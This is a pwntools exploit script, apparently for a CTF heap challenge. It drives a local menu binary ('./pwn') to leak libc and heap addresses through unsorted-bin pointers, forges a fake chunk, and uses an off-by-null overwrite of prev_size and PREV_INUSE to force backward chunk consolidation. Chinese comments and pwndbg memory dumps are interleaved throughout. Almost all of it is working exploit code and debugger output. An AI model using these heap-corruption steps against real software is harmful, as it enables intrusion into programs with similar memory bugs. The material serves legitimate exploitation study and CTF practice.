from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])
context.terminal = ['tmux', 'splitw', '-h']


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)

"""
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5645dc331000
Size: 0x210 (with flag bits: 0x211)

Allocated chunk | PREV_INUSE
Addr: 0x5645dc331210
Size: 0x210 (with flag bits: 0x211)

Allocated chunk | PREV_INUSE
Addr: 0x5645dc331420
Size: 0x100 (with flag bits: 0x101)

Allocated chunk | PREV_INUSE
Addr: 0x5645dc331520
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x5645dc331550
Size: 0x20ab0 (with flag bits: 0x20ab1)
"""
add_chunk(0, 0x208)
add_chunk(1, 0x208)
add_chunk(2, 0xf8)
add_chunk(3, 0x28)

# 释放chunk0 chunk2, 均进入unsorted bin
delete_chunk(0)
delete_chunk(2)

# 泄露libc
show_chunk(0)
tmp = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
# print("tmp", hex(tmp))
libc.address = tmp - 0x39bb78
print("libc.address", hex(libc.address))

# 泄露heap
edit_chunk(0, b"a" * 8)
show_chunk(0)
tmp = u64(p.recvuntil((b"\x55", b"\x56"))[-6:].ljust(8, b"\x00"))
# print("tmp", hex(tmp))
heap_base = tmp - 0x420
print("heap_base", hex(heap_base))

# 恢复chunk0
edit_chunk(0, p64(libc.address + 0x39bb78))
add_chunk(0, 0x200)
add_chunk(2, 0xf8)

# 构造fake chunk, FD/BK均要绕过检查(FD == BK == &fake_chunk)
fake_chunk = b""
fake_chunk += p64(0x0)
fake_chunk += p64(0x411)
fake_chunk += p64(heap_base + 0x10)
fake_chunk += p64(heap_base + 0x10)

"""
pwndbg> telescope 0x5645dc331000
00:0000│  0x5645dc331000 ◂— 0x0
01:0008│  0x5645dc331008 ◂— 0x211
02:0010│  0x5645dc331010 ◂— 0x0
03:0018│  0x5645dc331018 ◂— 0x411
04:0020│  0x5645dc331020 —▸ 0x5645dc331010 ◂— 0x0
05:0028│  0x5645dc331028 —▸ 0x5645dc331010 ◂— 0x0
06:0030│  0x5645dc331030 ◂— 0x0
07:0038│  0x5645dc331038 ◂— 0x0
pwndbg> telescope 0x5645dc331420
00:0000│  0x5645dc331420 ◂— 0x0
01:0008│  0x5645dc331428 ◂— 0x101
02:0010│  0x5645dc331430 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
03:0018│  0x5645dc331438 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
04:0020│  0x5645dc331440 ◂— 0x0
... ↓     3 skipped
"""
edit_chunk(0, fake_chunk)

"""
pwndbg> telescope 0x5645dc331420
00:0000│  0x5645dc331420 ◂— 0x410 <<<<< 已被修改
01:0008│  0x5645dc331428 ◂— 0x100
02:0010│  0x5645dc331430 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
03:0018│  0x5645dc331438 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
04:0020│  0x5645dc331440 ◂— 0x0
... ↓     3 skipped
"""
# off-by-null修改PREV_INUSE位, 同时修改prev_size
edit_chunk(1, b"a" * 0x200 + p64(0x410) + p8(0x0))

"""
pwndbg> telescope 0x5645dc331000
00:0000│  0x5645dc331000 ◂— 0x0
01:0008│  0x5645dc331008 ◂— 0x211
02:0010│  0x5645dc331010 ◂— 0x0
03:0018│  0x5645dc331018 ◂— 0x511 <<<<< 堆块合并后, fake_chunk.size = 0x511
04:0020│  0x5645dc331020 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
05:0028│  0x5645dc331028 —▸ 0x7f2f3ecbcb78 (main_arena+88) —▸ 0x5645dc331550 ◂— 0x0
06:0030│  0x5645dc331030 ◂— 0x0
07:0038│  0x5645dc331038 ◂— 0x0
"""
# 触发了堆块合并
delete_chunk(2)

p.interactive()
